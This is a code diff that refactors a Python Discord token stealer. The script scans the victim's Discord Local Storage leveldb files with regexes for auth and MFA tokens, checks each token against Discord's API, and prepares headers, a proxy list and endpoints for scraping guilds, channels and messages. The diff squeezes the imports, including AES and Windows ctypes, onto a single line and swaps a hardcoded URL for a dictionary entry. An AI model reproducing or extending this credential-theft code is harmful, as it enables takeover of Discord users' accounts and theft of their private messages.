@@ -1,14 +1,4 @@
-import os, re, json, requests,datetime, colorama, base64, subprocess, importlib
-from json import loads, dumps
-from colorama import *
-from urllib.request import Request, urlopen
-from json import loads, dumps
-import urllib.request, urllib.error
-from Crypto.Cipher import AES
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-from json import loads as json_loads, load
-from urllib.request import Request, urlopen
-
+import os, re, json, requests,datetime, colorama, base64, subprocess, importlib,urllib.request, urllib.error;from colorama import *;from urllib.request import Request, urlopen;from Crypto.Cipher import AES;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from json import dumps, loads as json_loads, load
 header,requests_url,modules, missing_modules,proxy_list,id_list, guild_list,guild_scrap,channel_scrap,user_scrap,message_sent=modules = { 'Cookie': '__dcfduid=30b25b30bdb811eca9acdd9d360ada08','Content-Type': 'application/json','x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImZyLUZSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJkaXNjb3JkLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiJodHRwczovL2Rpc2NvcmQuY29tLyIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6ImRpc2NvcmQuY29tIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYwNjQ1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='},{'proxies' : 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt','ip' : "http://ipinfo.io/json",'user' : 'https://discord.com/api/v6/users/@me','private_channel' : "https://discord.com/api/v9/users/@me/channels",'guild' : "https://discord.com/api/v9/users/@me/guilds",'guild_channel' : 'https://discord.com/api/v8/guilds/{guild_id}/channels','channel_content' : 'https://discord.com/api/v8/channels/{channel_id}/messages','message' : 'https://discord.com/api/v9/channels/{id}/messages','up_channel' : 'https://discord.com/api/v8/users/@me/channels'},['urllib.request','Crypto.Cipher','ctypes','json','colorama'],[],[],[],[],0,0,0,0
 
 def gather_modules():
@@ -60,7 +50,7 @@ def gather_token():
             for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb\\{file_name}", errors="ignore").readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                     for token in re.findall(regex, line):
-                        try: urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v9/users/@me", headers={'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11', 'authorization': token}))
+                        try: urllib.request.urlopen(urllib.request.Request(requests_url['user'], headers={'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11', 'authorization': token}))
                         except urllib.error.HTTPError as e: continue
                         if token not in found_tokens and token not in tokens:found_tokens.append(token)
         return found_tokens
